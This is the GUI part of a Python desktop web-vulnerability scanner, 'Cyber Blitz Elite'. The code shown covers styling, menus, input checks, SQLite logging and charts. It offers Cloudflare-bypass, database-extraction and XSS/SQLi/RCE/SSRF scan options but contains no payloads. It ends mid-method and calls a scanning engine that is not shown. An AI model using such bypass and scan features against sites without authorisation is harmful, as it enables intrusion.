#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Menu
from tkinter import font as tkfont
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure
import threading
import time
import random
import re
import webbrowser
import os
import json
import csv
import logging
import validators
from urllib.parse import urljoin, urlparse, parse_qs, unquote
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from PIL import Image, ImageTk
import io
from html import escape
from datetime import datetime
import socket
import ssl
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import ipaddress
import dns.resolver
import whois
from urllib3.exceptions import InsecureRequestWarning
import html
import base64
import zlib
import xml.etree.ElementTree as ET
import hashlib
import uuid
import sqlite3
import cloudscraper
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import numpy as np
import pandas as pd
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib import colors

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='cyberblitz.log'
)
logger = logging.getLogger(__name__)

class CyberBlitzUI:
    def __init__(self, master):
        self.master = master
        master.title("Cyber Blitz Elite - Advanced Web Vulnerability Scanner")
        
        # Initialize state variables first
        self.scanning = False
        self.paused = False
        self.vulnerability_count = 0
        self.page_count = 0
        self.scan_start_time = None
        self.scan_end_time = None
        self.current_config = {}
        self.target_history = []
        self.finding_history = []
        self.db_connection = sqlite3.connect('cyberblitz.db')
        self.init_database()
        
        # Configure main window
        master.geometry("1400x900")
        master.minsize(1200, 800)
        
        # Apply CSS-like styling
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
        
        # Custom window icon
        try:
            master.iconbitmap('icon.ico')
        except:
            pass
        
        # Initialize components
        self.create_menu()
        self.create_header()
        self.create_control_panel()
        self.create_results_panel()
        self.create_dashboard()
        self.create_status_bar()
        
        # Scanner engine
        self.scanner = ScannerEngine(
            status_callback=self.update_status,
            vuln_callback=self.add_vulnerability,
            progress_callback=self.update_progress,
            page_count_callback=self.update_page_count,
            db_callback=self.save_to_database
        )
        
        # Load configuration
        self.load_config()
        self.load_history()

    def configure_styles(self):
        """Configure custom styles for widgets"""
        # Modern color scheme
        bg_color = '#1a1a2e'
        panel_color = '#16213e'
        highlight_color = '#0f3460'
        text_color = '#e0e0e0'
        accent_color = '#4ecca3'
        critical_color = '#ff3860'
        high_color = '#ff7c4d'
        medium_color = '#ffdd59'
        low_color = '#48c774'
        info_color = '#209cee'
        
        # Configure main window
        self.master.configure(bg=bg_color)
        
        # Style configuration
        self.style.configure('.', background=bg_color, foreground=text_color, font=('Segoe UI', 10))
        self.style.configure('TFrame', background=bg_color)
        self.style.configure('TLabel', background=bg_color, foreground=text_color)
        self.style.configure('TButton', 
                           background=panel_color, 
                           foreground=text_color,
                           borderwidth=1,
                           relief='flat',
                           font=('Segoe UI', 9, 'bold'))
        self.style.map('TButton',
                      background=[('active', highlight_color), ('pressed', accent_color), ('disabled', '#3a3a3a')],
                      foreground=[('disabled', '#7a7a7a')])
        
        self.style.configure('TEntry', 
                           fieldbackground=panel_color, 
                           foreground=text_color,
                           insertcolor=text_color,
                           borderwidth=1,
                           relief='flat')
        
        self.style.configure('TCombobox', 
                           fieldbackground=panel_color, 
                           foreground=text_color,
                           selectbackground=highlight_color)
        
        self.style.configure('TSpinbox', 
                           fieldbackground=panel_color, 
                           foreground=text_color)
        
        # Custom styles for severity tags
        self.style.configure('critical.TLabel', foreground=critical_color, font=('Segoe UI', 9, 'bold'))
        self.style.configure('high.TLabel', foreground=high_color, font=('Segoe UI', 9, 'bold'))
        self.style.configure('medium.TLabel', foreground=medium_color)
        self.style.configure('low.TLabel', foreground=low_color)
        self.style.configure('info.TLabel', foreground=info_color)
        
        # Configure Treeview
        self.style.configure('Treeview', 
                           background=panel_color,
                           foreground=text_color,
                           fieldbackground=panel_color,
                           rowheight=25,
                           borderwidth=0)
        self.style.map('Treeview', 
                      background=[('selected', highlight_color)],
                      foreground=[('selected', text_color)])
        
        self.style.configure('Treeview.Heading', 
                           background=bg_color,
                           foreground=accent_color,
                           font=('Segoe UI', 9, 'bold'),
                           relief='flat')
        
        # Configure Notebook
        self.style.configure('TNotebook', background=bg_color, borderwidth=0)
        self.style.configure('TNotebook.Tab', 
                           background=panel_color,
                           foreground=text_color,
                           padding=[10, 5],
                           font=('Segoe UI', 9))
        self.style.map('TNotebook.Tab',
                      background=[('selected', highlight_color)],
                      foreground=[('selected', text_color)])

    def init_database(self):
        """Initialize the SQLite database"""
        cursor = self.db_connection.cursor()
        
        # Create tables if they don't exist
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS scan_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_url TEXT,
            scan_type TEXT,
            start_time TEXT,
            end_time TEXT,
            findings_count INTEGER,
            status TEXT
        )
        ''')
        
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_id INTEGER,
            type TEXT,
            url TEXT,
            severity TEXT,
            confidence TEXT,
            details TEXT,
            payload TEXT,
            FOREIGN KEY(scan_id) REFERENCES scan_history(id)
        )
        ''')
        
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS config (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key TEXT UNIQUE,
            value TEXT
        )
        ''')
        
        self.db_connection.commit()

    def save_to_database(self, finding):
        """Save finding to database"""
        if not hasattr(self, 'current_scan_id'):
            return
            
        cursor = self.db_connection.cursor()
        cursor.execute('''
        INSERT INTO findings (scan_id, type, url, severity, confidence, details, payload)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            self.current_scan_id,
            finding.get('type'),
            finding.get('url'),
            finding.get('severity'),
            finding.get('confidence'),
            finding.get('details', ''),
            finding.get('payload', '')
        ))
        self.db_connection.commit()

    def create_menu(self):
        """Create the main menu bar"""
        menubar = Menu(self.master, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        
        # File menu
        file_menu = Menu(menubar, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        file_menu.add_command(label="New Scan", command=self.clear_results)
        file_menu.add_command(label="Load Config", command=self.load_config_dialog)
        file_menu.add_command(label="Save Config", command=self.save_config_dialog)
        file_menu.add_separator()
        file_menu.add_command(label="History", command=self.show_history)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.on_closing)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Scan menu
        scan_menu = Menu(menubar, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        scan_menu.add_command(label="Start Scan", command=self.start_scan)
        scan_menu.add_command(label="Stop Scan", command=self.stop_scan)
        scan_menu.add_command(label="Pause/Resume", command=self.toggle_pause)
        scan_menu.add_separator()
        scan_menu.add_command(label="Spider", command=self.start_spider)
        scan_menu.add_command(label="Intruder", command=self.show_intruder)
        scan_menu.add_command(label="Cloudflare Bypass", command=self.toggle_cloudflare_bypass)
        menubar.add_cascade(label="Scan", menu=scan_menu)
        
        # Tools menu
        tools_menu = Menu(menubar, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        tools_menu.add_command(label="Repeater", command=self.show_repeater)
        tools_menu.add_command(label="Decoder", command=self.show_decoder)
        tools_menu.add_command(label="Comparer", command=self.show_comparer)
        tools_menu.add_separator()
        tools_menu.add_command(label="Network Info", command=self.show_network_info)
        tools_menu.add_command(label="Tech Stack", command=self.show_tech_stack)
        tools_menu.add_command(label="Port Scanner", command=self.show_port_scanner)
        tools_menu.add_command(label="Database Extractor", command=self.show_db_extractor)
        tools_menu.add_command(label="Subdomain Scanner", command=self.show_subdomain_scanner)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        # Help menu
        help_menu = Menu(menubar, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        help_menu.add_command(label="Documentation", command=self.open_documentation)
        help_menu.add_command(label="Cheat Sheets", command=self.show_cheat_sheets)
        help_menu.add_separator()
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.master.config(menu=menubar)

    def create_header(self):
        """Create the header section with logo and title"""
        header_frame = ttk.Frame(self.master, style='TFrame')
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Logo placeholder
        self.logo_label = ttk.Label(header_frame, text="⚡", font=('Arial', 24), style='TLabel', foreground='#4ecca3')
        self.logo_label.pack(side=tk.LEFT, padx=10)
        
        # Title
        title_frame = ttk.Frame(header_frame, style='TFrame')
        title_frame.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.title_label = ttk.Label(title_frame, 
                                   text="Cyber Blitz Elite", 
                                   font=('Segoe UI', 18, 'bold'),
                                   style='TLabel',
                                   foreground='#4ecca3')
        self.title_label.pack(anchor='w')
        
        self.subtitle_label = ttk.Label(title_frame, 
                                      text="Advanced Web Vulnerability Scanner v4.0", 
                                      font=('Segoe UI', 10),
                                      style='TLabel')
        self.subtitle_label.pack(anchor='w')
        
        # Quick actions
        action_frame = ttk.Frame(header_frame, style='TFrame')
        action_frame.pack(side=tk.RIGHT, padx=10)
        
        self.export_btn = ttk.Button(action_frame, text="Export", command=self.show_export_menu, width=10)
        self.export_btn.pack(side=tk.LEFT, padx=5)
        
        self.settings_btn = ttk.Button(action_frame, text="Settings", command=self.show_settings, width=10)
        self.settings_btn.pack(side=tk.LEFT, padx=5)
        
        self.docs_btn = ttk.Button(action_frame, text="Docs", command=self.open_documentation, width=8)
        self.docs_btn.pack(side=tk.LEFT, padx=5)

    def create_control_panel(self):
        """Create the control panel with scan options"""
        control_frame = ttk.Frame(self.master, style='TFrame')
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Target URL
        url_frame = ttk.Frame(control_frame, style='TFrame')
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="Target URL:", style='TLabel').pack(side=tk.LEFT)
        self.url_entry = ttk.Entry(url_frame, width=50, style='TEntry')
        self.url_entry.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        self.url_entry.insert(0, "http://example.com")
        
        # Authentication
        auth_frame = ttk.Frame(control_frame, style='TFrame')
        auth_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(auth_frame, text="Auth Type:", style='TLabel').pack(side=tk.LEFT)
        self.auth_type = ttk.Combobox(auth_frame, 
                                    values=["None", "Basic", "Cookie", "Bearer Token", "OAuth", "JWT"],
                                    state="readonly",
                                    width=12)
        self.auth_type.pack(side=tk.LEFT, padx=5)
        self.auth_type.set("None")
        
        self.auth_details = ttk.Entry(auth_frame, width=30, style='TEntry')
        self.auth_details.pack(side=tk.LEFT, padx=5)
        self.auth_details.config(state=tk.DISABLED)
        
        self.auth_type.bind("<<ComboboxSelected>>", self.toggle_auth_fields)
        
        # Scan options
        options_frame = ttk.Frame(control_frame, style='TFrame')
        options_frame.pack(fill=tk.X, pady=5)
        
        # Threads
        ttk.Label(options_frame, text="Threads:", style='TLabel').pack(side=tk.LEFT)
        self.threads_spin = ttk.Spinbox(options_frame, from_=1, to=50, width=5)
        self.threads_spin.pack(side=tk.LEFT, padx=10)
        self.threads_spin.set(10)
        
        # Depth
        ttk.Label(options_frame, text="Depth:", style='TLabel').pack(side=tk.LEFT)
        self.depth_spin = ttk.Spinbox(options_frame, from_=1, to=10, width=5)
        self.depth_spin.pack(side=tk.LEFT, padx=10)
        self.depth_spin.set(3)
        
        # Rate limit
        ttk.Label(options_frame, text="Delay (s):", style='TLabel').pack(side=tk.LEFT)
        self.rate_spin = ttk.Spinbox(options_frame, from_=0, to=10, increment=0.1, width=5)
        self.rate_spin.pack(side=tk.LEFT, padx=10)
        self.rate_spin.set(0.5)
        
        # Timeout
        ttk.Label(options_frame, text="Timeout (s):", style='TLabel').pack(side=tk.LEFT)
        self.timeout_spin = ttk.Spinbox(options_frame, from_=1, to=60, width=5)
        self.timeout_spin.pack(side=tk.LEFT, padx=10)
        self.timeout_spin.set(10)
        
        # Scan types
        ttk.Label(options_frame, text="Scan Types:", style='TLabel').pack(side=tk.LEFT)
        self.scan_types = ttk.Combobox(options_frame, 
                                      values=["Full Scan", "Quick Scan", "XSS Only", "SQLi Only", "LFI/RFI", "RCE", "SSRF", "XXE", "Custom"],
                                      state="readonly",
                                      width=12)
        self.scan_types.pack(side=tk.LEFT, padx=10)
        self.scan_types.set("Full Scan")
        
        # Buttons
        btn_frame = ttk.Frame(control_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan, style='TButton')
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_scan, state=tk.DISABLED, style='TButton')
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = ttk.Button(btn_frame, text="Clear", command=self.clear_results, style='TButton')
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        self.pause_btn = ttk.Button(btn_frame, text="Pause", command=self.toggle_pause, state=tk.DISABLED, style='TButton')
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(control_frame, orient=tk.HORIZONTAL, mode='determinate', style='TProgressbar')
        self.progress.pack(fill=tk.X, pady=5)
        
        # Stats frame
        stats_frame = ttk.Frame(control_frame, style='TFrame')
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.stats_labels = {}
        for severity, color in [('Critical', 'critical'), ('High', 'high'), 
                              ('Medium', 'medium'), ('Low', 'low'), ('Info', 'info')]:
            frame = ttk.Frame(stats_frame, style='TFrame')
            frame.pack(side=tk.LEFT, padx=10)
            
            ttk.Label(frame, text=f"{severity}:", style=f'{color}.TLabel').pack(side=tk.LEFT)
            self.stats_labels[severity.lower()] = ttk.Label(frame, text="0", style=f'{color}.TLabel', font=('Segoe UI', 9, 'bold'))
            self.stats_labels[severity.lower()].pack(side=tk.LEFT)

    def create_results_panel(self):
        """Create the results display panel"""
        results_frame = ttk.Frame(self.master, style='TFrame')
        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create notebook for multiple tabs
        self.notebook = ttk.Notebook(results_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Vulnerabilities tab
        vuln_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(vuln_frame, text="Vulnerabilities")
        
        # Treeview for results
        columns = ('time', 'type', 'url', 'severity', 'confidence')
        self.tree = ttk.Treeview(vuln_frame, columns=columns, show='headings')
        self.tree.heading('time', text='Time')
        self.tree.heading('type', text='Type')
        self.tree.heading('url', text='URL')
        self.tree.heading('severity', text='Severity')
        self.tree.heading('confidence', text='Confidence')
        
        self.tree.column('time', width=100, anchor='center')
        self.tree.column('type', width=150, anchor='center')
        self.tree.column('url', width=400)
        self.tree.column('severity', width=100, anchor='center')
        self.tree.column('confidence', width=100, anchor='center')
        
        # Add scrollbars
        y_scroll = ttk.Scrollbar(vuln_frame, orient=tk.VERTICAL, command=self.tree.yview)
        y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=y_scroll.set)
        
        x_scroll = ttk.Scrollbar(vuln_frame, orient=tk.HORIZONTAL, command=self.tree.xview)
        x_scroll.pack(side=tk.BOTTOM, fill=tk.X)
        self.tree.configure(xscrollcommand=x_scroll.set)
        
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        # Details panel
        details_frame = ttk.Frame(vuln_frame, style='TFrame')
        details_frame.pack(fill=tk.X, pady=5)
        
        self.details_text = scrolledtext.ScrolledText(details_frame, 
                                                    wrap=tk.WORD,
                                                    width=100,
                                                    height=10,
                                                    font=('Consolas', 9),
                                                    bg='#16213e',
                                                    fg='#e0e0e0',
                                                    insertbackground='white')
        self.details_text.pack(fill=tk.X)
        
        # Action buttons frame
        self.details_actions = ttk.Frame(details_frame, style='TFrame')
        self.details_actions.pack(fill=tk.X, pady=5)
        
        # Bind tree selection
        self.tree.bind('<<TreeviewSelect>>', self.show_details)
        
        # Create log tab
        log_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(log_frame, text="Scan Log")
        
        self.log_text = scrolledtext.ScrolledText(log_frame, 
                                                wrap=tk.WORD,
                                                width=100,
                                                height=30,
                                                font=('Consolas', 9),
                                                bg='#16213e',
                                                fg='#e0e0e0',
                                                insertbackground='white')
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Create configuration tab
        config_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(config_frame, text="Configuration")
        
        self.config_text = scrolledtext.ScrolledText(config_frame, 
                                                   wrap=tk.WORD,
                                                   width=100,
                                                   height=30,
                                                   font=('Consolas', 9),
                                                   bg='#16213e',
                                                   fg='#e0e0e0',
                                                   insertbackground='white')
        self.config_text.pack(fill=tk.BOTH, expand=True)
        
        # Create database tab
        db_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(db_frame, text="Database")
        
        self.db_text = scrolledtext.ScrolledText(db_frame, 
                                               wrap=tk.WORD,
                                               width=100,
                                               height=30,
                                               font=('Consolas', 9),
                                               bg='#16213e',
                                               fg='#e0e0e0',
                                               insertbackground='white')
        self.db_text.pack(fill=tk.BOTH, expand=True)

    def create_dashboard(self):
        """Create the dashboard panel with charts"""
        dashboard_frame = ttk.Frame(self.master, style='TFrame')
        dashboard_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create figures for charts
        self.dashboard_fig = Figure(figsize=(8, 4), dpi=100, facecolor='#1a1a2e')
        self.severity_fig = Figure(figsize=(4, 4), dpi=100, facecolor='#1a1a2e')
        self.timeline_fig = Figure(figsize=(8, 4), dpi=100, facecolor='#1a1a2e')
        
        # Create canvas for charts
        self.dashboard_canvas = FigureCanvasTkAgg(self.dashboard_fig, master=dashboard_frame)
        self.severity_canvas = FigureCanvasTkAgg(self.severity_fig, master=dashboard_frame)
        self.timeline_canvas = FigureCanvasTkAgg(self.timeline_fig, master=dashboard_frame)
        
        # Layout charts
        left_frame = ttk.Frame(dashboard_frame, style='TFrame')
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = ttk.Frame(dashboard_frame, style='TFrame')
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH)
        
        self.dashboard_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.severity_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.timeline_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Initial empty charts
        self.update_dashboard()

    def create_status_bar(self):
        """Create the status bar at bottom"""
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        
        self.scan_time_var = tk.StringVar()
        self.scan_time_var.set("00:00:00")
        
        self.scan_speed_var = tk.StringVar()
        self.scan_speed_var.set("0 pages/min")
        
        self.cloudflare_status = tk.StringVar()
        self.cloudflare_status.set("Cloudflare: Off")
        
        status_bar = ttk.Frame(self.master, style='TFrame')
        status_bar.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(status_bar, textvariable=self.status_var, style='TLabel').pack(side=tk.LEFT)
        
        ttk.Label(status_bar, text="| Time:", style='TLabel').pack(side=tk.LEFT, padx=10)
        ttk.Label(status_bar, textvariable=self.scan_time_var, style='TLabel').pack(side=tk.LEFT)
        
        ttk.Label(status_bar, text="| Speed:", style='TLabel').pack(side=tk.LEFT, padx=10)
        ttk.Label(status_bar, textvariable=self.scan_speed_var, style='TLabel').pack(side=tk.LEFT)
        
        ttk.Label(status_bar, text="| Vulnerabilities:", style='TLabel').pack(side=tk.LEFT, padx=10)
        self.vuln_count_label = ttk.Label(status_bar, text="0", style='TLabel', font=('Segoe UI', 9, 'bold'))
        self.vuln_count_label.pack(side=tk.LEFT)
        
        ttk.Label(status_bar, text="| Pages:", style='TLabel').pack(side=tk.LEFT, padx=10)
        self.page_count_label = ttk.Label(status_bar, text="0", style='TLabel', font=('Segoe UI', 9, 'bold'))
        self.page_count_label.pack(side=tk.LEFT)
        
        ttk.Label(status_bar, textvariable=self.cloudflare_status, style='info.TLabel').pack(side=tk.RIGHT, padx=10)
        
        # Start time update thread
        self.update_time_thread()

    def toggle_cloudflare_bypass(self):
        """Toggle cloudflare bypass mode"""
        self.scanner.cloudflare_bypass = not self.scanner.cloudflare_bypass
        status = "On" if self.scanner.cloudflare_bypass else "Off"
        self.cloudflare_status.set(f"Cloudflare: {status}")
        self.update_status(f"Cloudflare bypass {status}", "info")

    def update_time_thread(self):
        """Update scan time in status bar"""
        try:
            if self.scanning and self.scan_start_time:
                elapsed = datetime.now() - self.scan_start_time
                self.scan_time_var.set(str(elapsed).split('.')[0])
                
                # Calculate scan speed (pages per minute)
                if elapsed.total_seconds() > 0:
                    pages_per_min = (self.page_count / elapsed.total_seconds()) * 60
                    self.scan_speed_var.set(f"{pages_per_min:.1f} pages/min")
        except Exception as e:
            logger.error(f"Error updating time: {str(e)}")
        
        self.master.after(1000, self.update_time_thread)

    def update_dashboard(self, data=None):
        """Update dashboard charts with current data"""
        # Clear existing figures
        self.dashboard_fig.clear()
        self.severity_fig.clear()
        self.timeline_fig.clear()
        
        # Default data if none provided
        if data is None:
            data = {
                'vulnerabilities': [],
                'severity_counts': {
                    'critical': 0,
                    'high': 0,
                    'medium': 0,
                    'low': 0,
                    'info': 0
                },
                'timeline': []
            }
        
        # Create vulnerability trend chart
        ax1 = self.dashboard_fig.add_subplot(111)
        ax1.set_facecolor('#1a1a2e')
        
        if data['timeline']:
            times = [point['time'] for point in data['timeline']]
            counts = [point['count'] for point in data['timeline']]
            ax1.plot(times, counts, 'b-', label='Vulnerabilities')
            ax1.fill_between(times, counts, color='#4ecca3', alpha=0.2)
        
        ax1.set_title('Vulnerability Trend', color='white')
        ax1.set_xlabel('Time', color='white')
        ax1.set_ylabel('Count', color='white')
        ax1.tick_params(axis='x', colors='white')
        ax1.tick_params(axis='y', colors='white')
        
        # Create severity pie chart
        ax2 = self.severity_fig.add_subplot(111)
        ax2.set_facecolor('#1a1a2e')
        
        labels = []
        sizes = []
        colors = []
        
        for severity, count in data['severity_counts'].items():
            if count > 0:
                labels.append(severity.capitalize())
                sizes.append(count)
                colors.append(self.get_severity_color(severity))
        
        if sizes:
            ax2.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%',
                   textprops={'color': 'white'})
            ax2.set_title('Severity Distribution', color='white')
        
        # Create timeline chart
        ax3 = self.timeline_fig.add_subplot(111)
        ax3.set_facecolor('#1a1a2e')
        
        if data['timeline']:
            times = [point['time'] for point in data['timeline']]
            counts = [point['count'] for point in data['timeline']]
            ax3.bar(times, counts, color='#4ecca3', alpha=0.7)
        
        ax3.set_title('Vulnerability Timeline', color='white')
        ax3.set_xlabel('Time', color='white')
        ax3.set_ylabel('Count', color='white')
        ax3.tick_params(axis='x', colors='white')
        ax3.tick_params(axis='y', colors='white')
        
        # Redraw canvas
        self.dashboard_canvas.draw()
        self.severity_canvas.draw()
        self.timeline_canvas.draw()

    def get_severity_color(self, severity):
        """Get color for severity level"""
        colors = {
            'critical': '#ff3860',
            'high': '#ff7c4d',
            'medium': '#ffdd59',
            'low': '#48c774',
            'info': '#209cee'
        }
        return colors.get(severity.lower(), '#777777')

    def toggle_auth_fields(self, event=None):
        """Toggle authentication fields based on selected type"""
        auth_type = self.auth_type.get()
        
        if auth_type == "None":
            self.auth_details.config(state=tk.DISABLED)
            self.auth_details.delete(0, tk.END)
        else:
            self.auth_details.config(state=tk.NORMAL)
            if auth_type == "Basic":
                self.auth_details.delete(0, tk.END)
                self.auth_details.insert(0, "username:password")
            elif auth_type == "Cookie":
                self.auth_details.delete(0, tk.END)
                self.auth_details.insert(0, "cookie_name=cookie_value")
            elif auth_type == "Bearer Token":
                self.auth_details.delete(0, tk.END)
                self.auth_details.insert(0, "token_here")
            elif auth_type == "OAuth":
                self.auth_details.delete(0, tk.END)
                self.auth_details.insert(0, "client_id:client_secret")
            elif auth_type == "JWT":
                self.auth_details.delete(0, tk.END)
                self.auth_details.insert(0, "jwt_token")

    def validate_inputs(self):
        """Validate all input fields before starting scan"""
        url = self.url_entry.get().strip()
        if not url:
            raise ValueError("Target URL is required")
        
        if not validators.url(url):
            raise ValueError("Invalid URL format")
        
        try:
            threads = int(self.threads_spin.get())
            if not 1 <= threads <= 50:
                raise ValueError("Threads must be between 1-50")
            
            depth = int(self.depth_spin.get())
            if not 1 <= depth <= 10:
                raise ValueError("Depth must be between 1-10")
            
            rate = float(self.rate_spin.get())
            if not 0 <= rate <= 10:
                raise ValueError("Delay must be between 0-10 seconds")
            
            timeout = int(self.timeout_spin.get())
            if not 1 <= timeout <= 60:
                raise ValueError("Timeout must be between 1-60 seconds")
        except ValueError as e:
            raise ValueError(f"Invalid configuration: {str(e)}")
        
        # Validate authentication if provided
        auth_type = self.auth_type.get()
        if auth_type != "None":
            auth_details = self.auth_details.get().strip()
            if not auth_details:
                raise ValueError(f"{auth_type} authentication requires details")
            
            if auth_type == "Basic" and ":" not in auth_details:
                raise ValueError("Basic auth format: username:password")
            elif auth_type == "Cookie" and "=" not in auth_details:
                raise ValueError("Cookie format: name=value")
            elif auth_type == "OAuth" and ":" not in auth_details:
                raise ValueError("OAuth format: client_id:client_secret")
        
        return {
            'url': url,
            'threads': threads,
            'depth': depth,
            'rate_limit': rate,
            'timeout': timeout,
            'scan_type': self.scan_types.get(),
            'auth_type': auth_type,
            'auth_details': self.auth_details.get() if auth_type != "None" else None
        }

    def start_scan(self):
        """Start the scanning process"""
        try:
            config = self.validate_inputs()
            self.current_config = config
            
            if not self.scanning:
                self.clear_results()
                self.scanning = True
                self.paused = False
                self.scan_start_time = datetime.now()
                self.scan_end_time = None
                self.start_btn.config(state=tk.DISABLED)
                self.stop_btn.config(state=tk.NORMAL)
                self.pause_btn.config(state=tk.NORMAL)
                self.pause_btn.config(text="Pause")
                
                # Save to history
                self.save_to_history(config['url'], config['scan_type'])
                
                # Configure scanner
                self.scanner.configure(
                    rate_limit=config['rate_limit'],
                    max_threads=config['threads'],
                    max_depth=config['depth'],
                    timeout=config['timeout']
                )
                
                # Configure authentication if needed
                if config['auth_type'] != "None":
                    self.scanner.configure_auth(
                        config['auth_type'],
                        config['auth_details']
                    )
                
                # Start scan in a new thread
                scan_thread = threading.Thread(
                    target=self.scanner.scan,
                    args=(config['url'], config['scan_type']),
                    daemon=True
                )
                scan_thread.start()
                
                self.update_status(f"Started {config['scan_type']} on {config['url']}", "info")
                self.update_config_display(config)
            else:
                messagebox.showwarning("Warning", "Scan is already in progress")
        except ValueError as e:
            messagebox.showerror("Error", str(e))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start scan: {str(e)}")
            logger.exception("Scan start failed")

    def update_config_display(self, config):
        """Update the configuration tab with current settings"""
        self.config_text.delete(1.0, tk.END)
        config_str = json.dumps(config, indent=2)
        self.config_text.insert(tk.END, f"Current Scan Configuration:\n{config_str}")

    def stop_scan(self):
        """Stop the current scan"""
        if self.scanning:
            self.scanner.stop()
            self.scanning = False
            self.paused = False
            self.scan_end_time = datetime.now()
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.pause_btn.config(state=tk.DISABLED)
            
            # Calculate total scan duration
            if self.scan_start_time and self.scan_end_time:
                duration = self.scan_end_time - self.scan_start_time
                self.update_status(f"Scan completed in {duration}", "success")
            else:
                self.update_status("Scan stopped by user", "warning")

    def toggle_pause(self):
        """Toggle pause/resume scan"""
        if not self.scanning:
            return
            
        if self.paused:
            self.scanner.resume()
            self.paused = False
            self.pause_btn.config(text="Pause")
            self.update_status("Scan resumed", "info")
        else:
            self.scanner.pause()
            self.paused = True
            self.pause_btn.config(text="Resume")
            self.update_status("Scan paused", "warning")

    def clear_results(self):
        """Clear all scan results"""
        self.tree.delete(*self.tree.get_children())
        self.details_text.delete(1.0, tk.END)
        self.log_text.delete(1.0, tk.END)
        self.config_text.delete(1.0, tk.END)
        self.vulnerability_count = 0
        self.page_count = 0
        self.vuln_count_label.config(text="0")
        self.page_count_label.config(text="0")
        self.scan_time_var.set("00:00:00")
        self.scan_speed_var.set("0 pages/min")
        
        # Reset stats counters
        for label in self.stats_labels.values():
            label.config(text="0")
        
        self.progress['value'] = 0
        self.update_status("Ready")
        self.update_dashboard()

    def update_status(self, message, level="info"):
        """Update status bar and log"""
        colors = {
            "info": "#209cee",
            "success": "#48c774",
            "warning": "#ffdd59",
            "error": "#ff3860"
        }
        
        self.status_var.set(message)
        timestamp = time.strftime("[%H:%M:%S]")
        
        self.log_text.insert(tk.END, f"{timestamp} {message}\n", level)
        self.log_text.see(tk.END)
        self.log_text.tag_config(level, foreground=colors.get(level, "white"))
        
        self.master.update_idletasks()

    def update_progress(self, value, max_value):
        """Update progress bar"""
        if max_value > 0:
            percentage = (value / max_value) * 100
            self.progress['value'] = percentage
        self.master.update_idletasks()

    def update_page_count(self, count):
        """Update page count in status bar"""
        self.page_count = count
        self.page_count_label.config(text=str(count))

    def add_vulnerability(self, vuln):
        """Add a new vulnerability to the results"""
